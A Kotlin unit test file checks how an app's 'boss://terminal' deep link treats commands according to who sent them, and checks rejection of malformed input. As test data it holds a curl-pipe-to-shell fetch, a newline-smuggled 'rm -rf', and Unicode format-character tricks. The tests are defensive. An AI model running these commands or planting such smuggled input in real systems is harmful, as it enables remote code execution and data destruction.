package ai.rever.boss.cli

import ai.rever.boss.utils.DeepLinkOrigin
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * Guards what happens to a `boss://terminal?command=` request, which is decided
 * by who asked rather than by what the command says.
 *
 * `boss://` is registered with the OS, so the same link arrives whether the
 * operator typed `boss terminal -c …` or some other program asked the OS to open
 * a URL. [terminalCommandDisposition] is the one place that distinction is acted
 * on, so these cases are the ones that regress silently.
 */
class TerminalCommandOriginTest {
    @Test
    fun `a command the operator ran themselves runs unattended`() {
        assertEquals(
            TerminalCommandDisposition.RUN,
            terminalCommandDisposition("ls -la", DeepLinkOrigin.OPERATOR_CLI),
        )
        // `boss terminal -c` exists to run whatever the operator types, so no
        // command text is special-cased on this path.
        assertEquals(
            TerminalCommandDisposition.RUN,
            terminalCommandDisposition("curl https://example.com/x.sh | sh", DeepLinkOrigin.OPERATOR_CLI),
        )
    }

    @Test
    fun `a command from anywhere else is held for confirmation, never run`() {
        assertEquals(
            TerminalCommandDisposition.CONFIRM,
            terminalCommandDisposition("ls -la", DeepLinkOrigin.EXTERNAL),
        )
        assertEquals(
            TerminalCommandDisposition.CONFIRM,
            terminalCommandDisposition("curl https://example.com/x.sh | sh", DeepLinkOrigin.EXTERNAL),
        )
    }

    @Test
    fun `opening a terminal with no command needs no confirmation from anyone`() {
        DeepLinkOrigin.entries.forEach { origin ->
            assertEquals(
                TerminalCommandDisposition.RUN,
                terminalCommandDisposition(null, origin),
                "no command is the same request from $origin",
            )
        }
    }

    @Test
    fun `a command too long to display in full is dropped rather than confirmed`() {
        val longCommand = "e".repeat(TERMINAL_CONFIRM_MAX_COMMAND_LENGTH + 1)

        // Nobody can meaningfully approve a command the prompt cannot show.
        assertEquals(
            TerminalCommandDisposition.REJECT,
            terminalCommandDisposition(longCommand, DeepLinkOrigin.EXTERNAL),
        )
        // The operator's own command is never displayed, so the display bound
        // does not apply to it.
        assertEquals(
            TerminalCommandDisposition.RUN,
            terminalCommandDisposition(longCommand, DeepLinkOrigin.OPERATOR_CLI),
        )
        assertEquals(
            TerminalCommandDisposition.CONFIRM,
            terminalCommandDisposition("e".repeat(TERMINAL_CONFIRM_MAX_COMMAND_LENGTH), DeepLinkOrigin.EXTERNAL),
        )
    }

    @Test
    fun `a malformed command is dropped whoever asked`() {
        DeepLinkOrigin.entries.forEach { origin ->
            assertEquals(TerminalCommandDisposition.REJECT, terminalCommandDisposition("", origin))
            assertEquals(TerminalCommandDisposition.REJECT, terminalCommandDisposition("   ", origin))
            assertEquals(TerminalCommandDisposition.REJECT, terminalCommandDisposition("echo a\nrm -rf x", origin))
            // A NUL byte, which is what the previous check looked for.
            assertEquals(
                TerminalCommandDisposition.REJECT,
                terminalCommandDisposition("echo a" + Char(0) + "b", origin),
            )
        }
    }

    @Test
    fun `spaces in a command are ordinary and are not a rejection reason`() {
        // A shell command is words separated by spaces; treating a space as
        // malformed would leave `boss terminal -c` able to run only bare words.
        assertTrue(CLISecurityValidator.isValidCommand("echo a b"))
        assertEquals(
            TerminalCommandDisposition.RUN,
            terminalCommandDisposition("echo a b", DeepLinkOrigin.OPERATOR_CLI),
        )
        assertEquals(
            TerminalCommandDisposition.CONFIRM,
            terminalCommandDisposition("echo a b", DeepLinkOrigin.EXTERNAL),
        )
    }

    @Test
    fun `command validation accepts one printable line and rejects the rest`() {
        assertTrue(CLISecurityValidator.isValidCommand("ls -la"))
        assertTrue(CLISecurityValidator.isValidCommand("git commit -m \"a message\""))
        assertTrue(CLISecurityValidator.isValidCommand("a".repeat(4096)))

        assertFalse(CLISecurityValidator.isValidCommand("a".repeat(4097)))
        assertFalse(CLISecurityValidator.isValidCommand(""))
        // A line break would submit lines the operator was never shown.
        assertFalse(CLISecurityValidator.isValidCommand("echo hi\r\nwhoami"))
        // Format controls can make the reviewed text render differently from what runs.
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\u202Etxt"))
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\u2028whoami"))
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\uDB40\uDC41whoami"))
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\uD804\uDCBDwhoami"))
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\uD80D\uDC30whoami"))
        assertFalse(CLISecurityValidator.isValidCommand("echo safe\uD82F\uDCA0whoami"))
    }

    @Test
    fun `a command with no stated origin is treated as external`() {
        // CLICommand.OpenTerminal defaults its origin, so a caller that forgets
        // to say gets the cautious handling rather than the operator's.
        val command = CLICommand.OpenTerminal("ls -la")
        assertEquals(DeepLinkOrigin.EXTERNAL, command.origin)
        assertEquals(
            TerminalCommandDisposition.CONFIRM,
            terminalCommandDisposition(command.command, command.origin),
        )
    }
}
